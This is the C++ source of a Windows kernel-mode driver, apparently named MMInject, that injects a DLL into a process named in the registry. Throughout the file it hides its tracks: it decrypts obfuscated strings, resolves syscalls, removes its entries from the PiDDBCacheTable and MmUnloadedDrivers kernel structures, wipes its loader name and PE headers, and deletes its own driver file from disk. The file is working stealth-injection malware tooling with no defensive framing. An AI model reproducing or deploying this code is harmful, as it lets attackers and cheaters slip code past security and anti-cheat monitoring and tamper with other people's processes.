#include "MMInject.h"
#include "util.h"
#include "strings.h"
#include <stdarg.h>
#include <stdio.h>

#define DEALLOCATE_ON_UNLOAD	0

typedef struct _INJECT_DLL_PARAMS
{
	ULONG Pid;
	UNICODE_STRING ProcessName;
	UNICODE_STRING DllPath;
	BOOLEAN DeleteDll;
	BOOLEAN WaitForProcess;
	BOOLEAN WipePeHeaders;

	_INJECT_DLL_PARAMS() = default;

	VOID Init()
	{
		Pid = 0;
		ProcessName = { 0, sizeof(ProcessNameBuffer), ProcessNameBuffer };
		DllPath = { 0, sizeof(DllPathBuffer), DllPathBuffer };
		DeleteDll = FALSE;
		WaitForProcess = FALSE;
		WipePeHeaders = TRUE;
	}

private:
	WCHAR ProcessNameBuffer[MAX_PATH];
	WCHAR DllPathBuffer[MAX_PATH];
} INJECT_DLL_PARAMS, *PINJECT_DLL_PARAMS;

static
BOOLEAN
IsDriverExpired(
	);

static
BOOLEAN
DeletePiDDBCacheTableEntry(
	_In_ PUNICODE_STRING DriverFileName,
	_In_opt_ ULONG DriverTimeDateStamp
	);

static
VOID
CleanMmUnloadedDrivers(
	);

static
BOOLEAN
DestroyDriverFile(
	_In_ PDRIVER_OBJECT DriverObject
	);

static
BOOLEAN
DestroyDriverInformation(
	_In_ PDRIVER_OBJECT DriverObject
	);

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, InitDynamicData)
#pragma alloc_text(INIT, IsDriverExpired)
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, InjectDllWorker)
#pragma alloc_text(PAGE, DeletePiDDBCacheTableEntry)
#pragma alloc_text(PAGE, CleanMmUnloadedDrivers)
#pragma alloc_text(PAGE, CleanMmUnloadedDriversWorker)
#pragma alloc_text(PAGE, DestroyDriverFile)
#pragma alloc_text(PAGE, DestroyDriverInformation)
#pragma alloc_text(PAGE, DriverUnload)
#endif

extern PVOID RegionBase, MappedPages;
extern PMDL Mdl;
extern ULONG_PTR NtoskrnlBase;

DYNAMIC_DATA DynData;
t_NtCreateThreadEx NtCreateThreadEx = nullptr;
t_NtResumeThread NtResumeThread = nullptr;
t_NtTerminateThread NtTerminateThread = nullptr;
t_NtProtectVirtualMemory NtProtectVirtualMemory = nullptr;

static INJECT_DLL_PARAMS InjectDllParameters;
static KEVENT UnloadAllowed;

#if !OBFUSCATE
VOID
Printf(
	_In_ PCCH Format,
	_In_ ...
	)
{
	CHAR Message[512];
	va_list VaList;
	va_start(VaList, Format);
	const ULONG N = _vsnprintf_s(Message, sizeof(Message), Format, VaList);
	Message[N] = '\0';
	vDbgPrintExWithPrefix("[INJECTOR] ", DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, Message, VaList);
	va_end(VaList);
}
#endif

NTSTATUS
InitDynamicData(
	_Out_ PDYNAMIC_DATA Data
	)
{
	RtlZeroMemory(Data, sizeof(*Data));
	Data->DYN_PDE_BASE = PDE_BASE;
	Data->DYN_PTE_BASE = PTE_BASE;

	RTL_OSVERSIONINFOEXW VersionInfo = { sizeof(RTL_OSVERSIONINFOEXW) };
	NTSTATUS Status = RtlGetVersion(reinterpret_cast<PRTL_OSVERSIONINFOW>(&VersionInfo));
	if (!NT_SUCCESS(Status))
		return Status;
	ULONG ShortVersion = (VersionInfo.dwMajorVersion << 8) | (VersionInfo.dwMinorVersion << 4) | VersionInfo.wServicePackMajor;
	Data->Version = static_cast<WinVer>(ShortVersion);

	if (ShortVersion < WINVER_7 || ShortVersion == WINVER_8)
		return STATUS_NOT_SUPPORTED;
#if NTDDI_VERSION == NTDDI_WIN7
	if (ShortVersion != WINVER_7 && ShortVersion != WINVER_7_SP1)
		return STATUS_NOT_SUPPORTED;
#elif NTDDI_VERSION == NTDDI_WINBLUE
	if (ShortVersion != WINVER_81)
		return STATUS_NOT_SUPPORTED;
#elif NTDDI_VERSION >= NTDDI_WIN10 && NTDDI_VERSION <= NTDDI_WIN10_19H1
	if (ShortVersion != WINVER_10 || VersionInfo.dwBuildNumber < 16299)
		return STATUS_NOT_SUPPORTED;
#else
	#error Unsupported OS build version
#endif

	Status = LocatePspNotifyEnableMask(Data);
	if (!NT_SUCCESS(Status))
		return Status;

	Status = LocateMmUnloadedDrivers(Data);
	if (!NT_SUCCESS(Status))
		return Status;

	Status = LocatePiDDBCacheTable(Data);
	if (!NT_SUCCESS(Status))
		return Status;

	if (VersionInfo.dwBuildNumber <= 15063)
	{
		// These only exist in Win 10 RS3+
		Data->MitigationFlagsOffset = 0;
		Data->MitigationFlags2Offset = 0;
	}

	switch (ShortVersion)
	{
	// Windows 7
	// Windows 7 SP1
	case WINVER_7:
	case WINVER_7_SP1:
		Data->ProtectionOffset = 0x43C; // Bitfield, bit index - 0xB
		Data->ObjectTableOffset = 0x200;
		Data->EProcessFlagsOffset = 0x440;
		Data->EProcessFlags2Offset = 0x43C;
		Data->VadRootOffset = 0x448;
		Data->PreviousModeOffset = 0x1F6;
		break;

	// Windows 8.1
	case WINVER_81:
		Data->ProtectionOffset = 0x67A;
		Data->ObjectTableOffset = 0x408;
		Data->EProcessFlagsOffset = 0x2FC;
		Data->EProcessFlags2Offset = 0x2F8;
		Data->VadRootOffset = 0x5D8;
		Data->PreviousModeOffset = 0x232;
		break;
	
	case WINVER_10:
		// Windows 10, build 16299/17134/17763
		if (VersionInfo.dwBuildNumber == 16299 || VersionInfo.dwBuildNumber == 17134 || VersionInfo.dwBuildNumber == 17763)
		{
			Data->Version = VersionInfo.dwBuildNumber == 16299 ? WINVER_10_RS3 : (VersionInfo.dwBuildNumber == 17134 ? WINVER_10_RS4 : WINVER_10_RS5);
			Data->ProtectionOffset = 0x6CA;
			Data->ObjectTableOffset = 0x418;
			Data->EProcessFlagsOffset = 0x304;
			Data->EProcessFlags2Offset = 0x300;
			Data->MitigationFlagsOffset = VersionInfo.dwBuildNumber <= 17134 ? 0x828 : 0x820;
			Data->MitigationFlags2Offset = VersionInfo.dwBuildNumber <= 17134 ? 0x82C : 0x824;
			Data->VadRootOffset = 0x628;
			Data->PreviousModeOffset = 0x232;
			Status = LocatePageTables(Data);
			break;
		}
		// Windows 10 19H1
		if (VersionInfo.dwBuildNumber == 18362)
		{
			Data->Version = WINVER_10_19H1;
			Data->ProtectionOffset = 0x6FA;
			Data->ObjectTableOffset = 0x418;
			Data->EProcessFlagsOffset = 0x30C;
			Data->EProcessFlags2Offset = 0x308;
			Data->MitigationFlagsOffset = 0x850;
			Data->MitigationFlags2Offset = 0x854;
			Data->VadRootOffset = 0x658;
			Data->PreviousModeOffset = 0x232;
			Status = LocatePageTables(Data);
			break;
		}
		return STATUS_NOT_SUPPORTED;
	default:
		break;
	}

	return Data->VadRootOffset != 0
		? Status
		: STATUS_INVALID_KERNEL_INFO_VERSION;
}

static
BOOLEAN
IsDriverExpired(
	)
{
	TIME_FIELDS ExpirationDate;
	RtlZeroMemory(&ExpirationDate, sizeof(ExpirationDate));
	ExpirationDate.Year = 2020;
	ExpirationDate.Month = 01;
	ExpirationDate.Day = 01;

	LARGE_INTEGER ExpirationTime;
	if (!RtlTimeFieldsToTime(&ExpirationDate, &ExpirationTime))
		return TRUE;

	LARGE_INTEGER CurrentTime;
	KeQuerySystemTime(&CurrentTime);
	if ((CurrentTime.QuadPart > ExpirationTime.QuadPart))
		return TRUE;

	return FALSE;
}

static
BOOLEAN
DeletePiDDBCacheTableEntry(
	_In_ PUNICODE_STRING DriverFileName,
	_In_opt_ ULONG DriverTimeDateStamp
	)
{
	PAGED_CODE();

	PIDDBCACHE_ENTRY LookupEntry;
	RtlZeroMemory(&LookupEntry, sizeof(LookupEntry));
	LookupEntry.DriverName = *DriverFileName;
	LookupEntry.TimeDateStamp = DriverTimeDateStamp;

	if (DynData.PiDDBLock != nullptr)
		ExAcquireResourceExclusiveLite(DynData.PiDDBLock, TRUE);

	const PVOID OldTableContext = DynData.PiDDBCacheTable->TableContext;
	if (DriverTimeDateStamp == 0)
		DynData.PiDDBCacheTable->TableContext = reinterpret_cast<PVOID>(1);

	BOOLEAN Deleted = FALSE;
	const PPIDDBCACHE_ENTRY FoundEntry = static_cast<PPIDDBCACHE_ENTRY>(RtlLookupElementGenericTableAvl(DynData.PiDDBCacheTable, &LookupEntry));
	if (FoundEntry != nullptr)
	{
		RemoveEntryList(&FoundEntry->List);
		Deleted = RtlDeleteElementGenericTableAvl(DynData.PiDDBCacheTable, FoundEntry);
		if (Deleted)
		{
			ExFreePool(FoundEntry->DriverName.Buffer);
		}
	}

	DynData.PiDDBCacheTable->TableContext = OldTableContext;

	if (DynData.PiDDBLock != nullptr)
		ExReleaseResourceLite(DynData.PiDDBLock);
	
	return Deleted;
}

static
VOID
CleanMmUnloadedDrivers(
	)
{
	PAGED_CODE();

	ULONG NumberOfUnloadedModules = *DynData.MmLastUnloadedDriver;
	if (NumberOfUnloadedModules == 0)
	{
		Printf("MmLastUnloadedDriver is 0: no modules in MmUnloadedDrivers\n");
		return;
	}
	if (NumberOfUnloadedModules == 1)
	{
		Printf("MmLastUnloadedDriver is 1: leaving this driver alone\n");
		return;
	}

	CHAR PsLoadedModuleResourceName[decltype(EncryptedPsLoadedModuleResourceString)::Length];
	DecryptString(EncryptedPsLoadedModuleResourceString, PsLoadedModuleResourceName);
	const PERESOURCE PsLoadedModuleResource = static_cast<PERESOURCE>(GetProcedureAddress(NtoskrnlBase, PsLoadedModuleResourceName));
	RtlSecureZeroMemory(PsLoadedModuleResourceName, decltype(EncryptedPsLoadedModuleResourceString)::Length);

	KeEnterGuardedRegion();

	if (PsLoadedModuleResource != nullptr)
		ExAcquireResourceExclusiveLite(PsLoadedModuleResource, TRUE);

	NumberOfUnloadedModules = *DynData.MmLastUnloadedDriver;

	const PUNLOADED_DRIVER UnloadedDrivers = *DynData.MmUnloadedDrivers;
	Printf("CleanMmUnloadedDrivers: UNLOADED_DRIVER[%u] start address: 0x%p\n", NumberOfUnloadedModules, UnloadedDrivers);

	const ULONG Start = NumberOfUnloadedModules > 5 ? NumberOfUnloadedModules - 5 : 1;
	const ULONG End = max(1, NumberOfUnloadedModules);
	for (ULONG i = Start; i < End; ++i)
	{
		if (UnloadedDrivers[i].Name.Buffer == nullptr)
			continue;

		Printf("CleanMmUnloadedDrivers: [i=%u] %wZ. Start: 0x%p, end: 0x%p. Removing...\n", i,
			&UnloadedDrivers[i].Name, UnloadedDrivers[i].StartAddress, UnloadedDrivers[i].EndAddress);

		if (!DeletePiDDBCacheTableEntry(&UnloadedDrivers[i].Name, 0))
			Printf("WARNING: failed to delete %wZ from PiDDBCacheTable!\n", &UnloadedDrivers[i].Name);

		RtlSecureZeroMemory(UnloadedDrivers[i].Name.Buffer, UnloadedDrivers[i].Name.MaximumLength);
		UnloadedDrivers[i].Name.Length = UnloadedDrivers[i].Name.MaximumLength = 0;
		ExFreePoolWithTag(UnloadedDrivers[i].Name.Buffer, 'TDmM');
		UnloadedDrivers[i].Name.Buffer = nullptr;

		(*DynData.MmLastUnloadedDriver)--;
	}

	if (PsLoadedModuleResource != nullptr)
		ExReleaseResourceLite(PsLoadedModuleResource);

	KeLeaveGuardedRegion();
}

NTSTATUS
DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
	)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	PAGED_CODE();

	WCHAR DllRegKey[decltype(EncryptedDllRegString)::Length], DriverDeleteRegValue[decltype(EncryptedDriverDeleteString)::Length];
	DecryptString(EncryptedDllRegString, DllRegKey);
	DecryptString(EncryptedDriverDeleteString, DriverDeleteRegValue);
	BOOLEAN DeleteDriver = FALSE;
	if (NT_SUCCESS(RegQueryValueBoolean(DllRegKey,
										DriverDeleteRegValue,
										&DeleteDriver))
		&& DeleteDriver)
	{
		if (!DestroyDriverFile(DriverObject))
		{
			Printf("Failed to delete driver file!\n");
			return STATUS_DRIVER_UNABLE_TO_LOAD;
		}
	}

	RtlSecureZeroMemory(DriverDeleteRegValue, decltype(EncryptedDriverDeleteString)::Length);

	if (IsDriverExpired())
		return STATUS_ACCESS_DENIED;

	KeInitializeEvent(&UnloadAllowed,
						NotificationEvent,
						FALSE);

	NTSTATUS Status = InitDynamicData(&DynData);
	if (!NT_SUCCESS(Status))
	{
		Printf("Failed to initialize dynamic data: %08X\n", Status);
		return Status;
	}

	Status = SsdtInitialize();
	if (!NT_SUCCESS(Status))
	{
		Printf("Failed to initialize SSDT: %08X\n", Status);
		return Status;
	}

	CHAR NtCreateThreadExName[decltype(EncryptedNtCreateThreadExString)::Length];
	DecryptString(EncryptedNtCreateThreadExString, NtCreateThreadExName);
	NtCreateThreadEx = reinterpret_cast<t_NtCreateThreadEx>(GetSyscallAddress(NtCreateThreadExName));
	RtlSecureZeroMemory(NtCreateThreadExName, decltype(EncryptedNtCreateThreadExString)::Length);

	CHAR NtResumeThreadName[decltype(EncryptedNtResumeThreadString)::Length];
	DecryptString(EncryptedNtResumeThreadString, NtResumeThreadName);
	NtResumeThread = reinterpret_cast<t_NtResumeThread>(GetSyscallAddress(NtResumeThreadName));
	RtlSecureZeroMemory(NtResumeThreadName, decltype(EncryptedNtResumeThreadString)::Length);

	CHAR NtTerminateThreadName[decltype(EncryptedNtTerminateThreadString)::Length];
	DecryptString(EncryptedNtTerminateThreadString, NtTerminateThreadName);
	NtTerminateThread = reinterpret_cast<t_NtTerminateThread>(GetSyscallAddress(NtTerminateThreadName));
	RtlSecureZeroMemory(NtTerminateThreadName, decltype(EncryptedNtTerminateThreadString)::Length);

	CHAR NtProtectVirtualMemoryName[decltype(EncryptedNtProtectVirtualMemoryString)::Length];
	DecryptString(EncryptedNtProtectVirtualMemoryString, NtProtectVirtualMemoryName);
	NtProtectVirtualMemory = reinterpret_cast<t_NtProtectVirtualMemory>(GetSyscallAddress(NtProtectVirtualMemoryName));
	RtlSecureZeroMemory(NtProtectVirtualMemoryName, decltype(EncryptedNtProtectVirtualMemoryString)::Length);

	if (NtCreateThreadEx == nullptr || NtResumeThread == nullptr || NtTerminateThread == nullptr || NtProtectVirtualMemory == nullptr)
	{
		SsdtUninitialize();
		return STATUS_PROCEDURE_NOT_FOUND;
	}

	RtlSecureZeroMemory(&InjectDllParameters, sizeof(InjectDllParameters));
	InjectDllParameters.Init();

	WCHAR System32Path[decltype(EncryptedSystem32PathString)::Length];
	UNICODE_STRING System32FileName = { decltype(EncryptedSystem32PathString)::Length - sizeof(WCHAR), decltype(EncryptedSystem32PathString)::Length, System32Path };

	WCHAR DllRegValue[decltype(EncryptedDllString)::Length],
		DeleteRegValue[decltype(EncryptedDeleteString)::Length];
	DecryptString(EncryptedDllString, DllRegValue);
	DecryptString(EncryptedDeleteString, DeleteRegValue);

	DECLARE_UNICODE_STRING_SIZE(ProcessId, 16);
	Status = RegQueryValueString(DllRegKey,
								DllRegValue,
								&InjectDllParameters.DllPath);
	if (NT_SUCCESS(Status))
	{
		Status = RegQueryValueBoolean(DllRegKey,
								DeleteRegValue,
								&InjectDllParameters.DeleteDll);
	}

	RtlSecureZeroMemory(DllRegKey, decltype(EncryptedDllRegString)::Length);
	RtlSecureZeroMemory(DllRegValue, decltype(EncryptedDllString)::Length);
	RtlSecureZeroMemory(DeleteRegValue, decltype(EncryptedDeleteString)::Length);
	if (!NT_SUCCESS(Status))
		goto finished;

	WCHAR ExeRegKey[decltype(EncryptedExeRegString)::Length], ExeRegValue[decltype(EncryptedExeString)::Length],
		ExeRegNameValue[decltype(EncryptedExeNameString)::Length], WaitForProcessRegValue[decltype(EncryptedWaitString)::Length];
	DecryptString(EncryptedExeRegString, ExeRegKey);
	DecryptString(EncryptedExeString, ExeRegValue);
	DecryptString(EncryptedExeNameString, ExeRegNameValue);
	DecryptString(EncryptedWaitString, WaitForProcessRegValue);
	Status = RegQueryValueString(ExeRegKey,
								ExeRegValue,
								&ProcessId);
	if (NT_SUCCESS(Status))
		Status = RtlUnicodeStringToInteger(&ProcessId, 10, &InjectDllParameters.Pid);

	if (InjectDllParameters.Pid == 0)
	{
		Status = RegQueryValueString(ExeRegKey,
									ExeRegNameValue,
									&InjectDllParameters.ProcessName);
		if (NT_SUCCESS(Status))
		{
			Status = RegQueryValueBoolean(ExeRegKey,
										WaitForProcessRegValue,
										&InjectDllParameters.WaitForProcess);
		}
	}

	RtlSecureZeroMemory(ExeRegKey, decltype(EncryptedExeRegString)::Length);
	RtlSecureZeroMemory(ExeRegValue, decltype(EncryptedExeString)::Length);
	RtlSecureZeroMemory(ExeRegNameValue, decltype(EncryptedExeNameString)::Length);
	RtlSecureZeroMemory(WaitForProcessRegValue, decltype(EncryptedWaitString)::Length);
	if (!NT_SUCCESS(Status))
		goto finished;

	DecryptString(EncryptedSystem32PathString, System32FileName.Buffer);
	const PDEVICE_OBJECT System32FsDevice = IopGetBaseFsDeviceObject(&System32FileName);
	if (System32FsDevice == nullptr)
	{
		Printf("Failed to get base FS device object for %wZ needed to queue work item. Aborting\n", &System32FileName);
		Status = STATUS_NOT_FOUND;
		goto finished;
	}
	const PIO_WORKITEM InjectDllWorkItem = IoAllocateWorkItem(System32FsDevice);
	const PIO_WORKITEM CleanMmUnloadedDriversWorkItem = IoAllocateWorkItem(System32FsDevice);
	RtlSecureZeroMemory(System32FileName.Buffer, decltype(EncryptedSystem32PathString)::Length);
	ObfDereferenceObject(System32FsDevice);
	if (InjectDllWorkItem == nullptr || CleanMmUnloadedDriversWorkItem == nullptr)
	{
		Status = STATUS_NO_MEMORY;
		goto finished;
	}

	InjectDllParameters.WipePeHeaders = TRUE;
	IoQueueWorkItemEx(InjectDllWorkItem,
					InjectDllWorker,
					CriticalWorkQueue,
					&InjectDllParameters);

	IoQueueWorkItemEx(CleanMmUnloadedDriversWorkItem,
					CleanMmUnloadedDriversWorker,
					CriticalWorkQueue,
					&UnloadAllowed);

	DriverObject->DriverUnload = DriverUnload;

finished:
	if (!NT_SUCCESS(Status))
	{
		KeSetEvent(&UnloadAllowed,
					EVENT_INCREMENT,
					FALSE);
		DriverUnload(DriverObject);
	}

	return Status;
}

_Use_decl_annotations_
VOID
InjectDllWorker(
	_In_ PVOID IoObject,
	_In_opt_ PVOID Context,
	_In_ PIO_WORKITEM IoWorkItem
	)
{
	PAGED_CODE();

	UNREFERENCED_PARAMETER(IoObject);

	IoFreeWorkItem(IoWorkItem);

	NT_ASSERT(KeSetPreviousMode(KernelMode) == KernelMode);

	const PINJECT_DLL_PARAMS DllParams = static_cast<PINJECT_DLL_PARAMS>(Context);
	InjectDll(DllParams->Pid,
			&DllParams->ProcessName,
			DllParams->WaitForProcess,
			&DllParams->DllPath,
			DllParams->DeleteDll,
			DllParams->WipePeHeaders);
}

_Use_decl_annotations_
VOID
CleanMmUnloadedDriversWorker(
	_In_ PVOID IoObject,
	_In_opt_ PVOID Context,
	_In_ PIO_WORKITEM IoWorkItem
	)
{
	PAGED_CODE();

	UNREFERENCED_PARAMETER(IoObject);

	IoFreeWorkItem(IoWorkItem);

	const PKEVENT AllowUnloadEvent = static_cast<PKEVENT>(Context);

	
	RtlSleep(1500);

	CleanMmUnloadedDrivers();

	KeSetEvent(AllowUnloadEvent,
				EVENT_INCREMENT,
				FALSE);
}

static
BOOLEAN
DestroyDriverFile(
	_In_ PDRIVER_OBJECT DriverObject
	)
{
	PAGED_CODE();

	if (DriverObject == nullptr || DriverObject->DriverSection == nullptr)
		return FALSE;

	const PKLDR_DATA_TABLE_ENTRY Entry = static_cast<PKLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
	UNICODE_STRING DriverPath = Entry->FullDllName;
	if (DriverPath.Length <= 5 * sizeof(WCHAR) || DriverPath.Buffer == nullptr)
		return FALSE;

	OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&DriverPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE);
	NTSTATUS Status = NtDeleteFile(&ObjectAttributes);
	if (NT_SUCCESS(Status))
	{
		Printf("Driver file \"%wZ\" has been deleted.\n", &DriverPath);
		return TRUE;
	}

	IO_DRIVER_CREATE_CONTEXT DriverCreateContext;
	IoInitializeDriverCreateContext(&DriverCreateContext);
	const PDEVICE_OBJECT BaseFsDeviceObject = IopGetBaseFsDeviceObject(&DriverPath);
	DriverCreateContext.DeviceObjectHint = BaseFsDeviceObject;

	IO_STATUS_BLOCK IoStatusBlock;
	HANDLE FileHandle;
	Status = IoCreateFileEx(&FileHandle,
							SYNCHRONIZE | DELETE,
							&ObjectAttributes,
							&IoStatusBlock,
							nullptr,
							FILE_ATTRIBUTE_NORMAL,
							FILE_SHARE_DELETE,
							FILE_OPEN,
							FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT | FILE_OPEN_FOR_BACKUP_INTENT,
							nullptr,
							0,
							CreateFileTypeNone,
							nullptr,
							IO_NO_PARAMETER_CHECKING | IO_IGNORE_SHARE_ACCESS_CHECK,
							BaseFsDeviceObject != nullptr
								? &DriverCreateContext
								: nullptr);

	if (BaseFsDeviceObject != nullptr)
		ObfDereferenceObject(BaseFsDeviceObject);

	if (!NT_SUCCESS(Status))
		return FALSE;

	PFILE_OBJECT FileObject;
	Status = ObReferenceObjectByHandleWithTag(FileHandle,
											SYNCHRONIZE | DELETE,
											*IoFileObjectType,
											KernelMode,
											GetPoolTag(),
											reinterpret_cast<PVOID*>(&FileObject),
											nullptr);
	if (!NT_SUCCESS(Status))
	{
		ObCloseHandle(FileHandle, KernelMode);
		return FALSE;
	}

	const PSECTION_OBJECT_POINTERS SectionObjectPointer = FileObject->SectionObjectPointer;
	SectionObjectPointer->ImageSectionObject = nullptr;

	const BOOLEAN ImageSectionFlushed = MmFlushImageSection(SectionObjectPointer, MmFlushForDelete);

	ObfDereferenceObject(FileObject);
	ObCloseHandle(FileHandle, KernelMode);

	if (ImageSectionFlushed)
	{
		Status = NtDeleteFile(&ObjectAttributes);
		if (NT_SUCCESS(Status))
		{
			Printf("Driver file \"%wZ\" has been deleted.\n", &DriverPath);
		}
	}

	return ImageSectionFlushed && NT_SUCCESS(Status);
}

static
BOOLEAN
DestroyDriverInformation(
	_In_ PDRIVER_OBJECT DriverObject
	)
{
	PAGED_CODE();

	const ULONG_PTR DriverAddress = reinterpret_cast<ULONG_PTR>(_ReturnAddress());
	const PKLDR_DATA_TABLE_ENTRY Entry = static_cast<PKLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
	if (Entry == nullptr)
		return FALSE;

	UNICODE_STRING DriverFileName = Entry->BaseDllName;
	if (DriverFileName.Length <= sizeof(WCHAR) || DriverFileName.Buffer == nullptr)
		return FALSE;

	const PIMAGE_NT_HEADERS NtHeaders = RtlpImageNtHeaderEx(Entry->DllBase, Entry->SizeOfImage);
	if (NtHeaders == nullptr)
		return FALSE;

	__try
	{
		if (Entry->DllBase != nullptr &&
			reinterpret_cast<ULONG_PTR>(Entry->DllBase) >= reinterpret_cast<ULONG_PTR>(MmSystemRangeStart) &&
			DriverAddress >= reinterpret_cast<ULONG_PTR>(Entry->DllBase) &&
			DriverAddress < reinterpret_cast<ULONG_PTR>(Entry->DllBase) + Entry->SizeOfImage)
		{
			if (!DeletePiDDBCacheTableEntry(&DriverFileName, NtHeaders->FileHeader.TimeDateStamp))
				Printf("WARNING: failed to delete %wZ from PiDDBCacheTable!\n", &DriverFileName);
			RtlSecureZeroMemory(Entry->BaseDllName.Buffer, Entry->BaseDllName.MaximumLength);
			Entry->BaseDllName.Length = Entry->BaseDllName.MaximumLength = 0;
			return TRUE;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		NOTHING;
	}
	return FALSE;
}

VOID
DriverUnload(
	_In_ PDRIVER_OBJECT DriverObject
	)
{
	PAGED_CODE();

	CancelAllProcessWaits();

	KeWaitForSingleObject(&UnloadAllowed,
						Executive,
						KernelMode,
						FALSE,
						nullptr);

	if (DestroyDriverInformation(DriverObject))
		Printf("Destroyed driver information.\n");
	else
		Printf("Failed to destroy driver information.\n");

#if DEALLOCATE_ON_UNLOAD
	if (MappedPages != nullptr)
		MmUnmapLockedPages(MappedPages, Mdl);
	if (Mdl != nullptr)
		IoFreeMdl(Mdl);
	if (RegionBase != nullptr)
		ExFreePool(RegionBase);
#endif

	SsdtUninitialize();
	Printf("Driver unloaded.\n");
}
